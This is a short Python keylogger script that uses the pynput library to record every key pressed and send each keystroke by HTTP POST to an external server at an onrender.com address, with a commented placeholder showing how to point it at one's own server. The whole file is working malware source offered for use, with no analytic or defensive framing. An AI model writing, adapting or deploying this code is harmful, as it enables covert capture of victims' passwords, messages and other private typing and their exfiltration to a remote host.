import requests
from pynput.keyboard import Key, Listener

# Replace this with your Render server URL
# server_url = 'https://your-app-name.onrender.com/log'
server_url = 'https://ishteeskeylogger.onrender.com/log'

def on_press(key):
    try:
        keystroke = f'{key.char}'
    except AttributeError:
        if key == Key.space:
            keystroke = ' '
        else:
            keystroke = f'[{key}]'

    # Send the keystroke to the server
    requests.post(server_url, data={'key': keystroke})

def on_release(key):
    if key == Key.esc:
        return False  # Stop listener

# Start keylogger listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
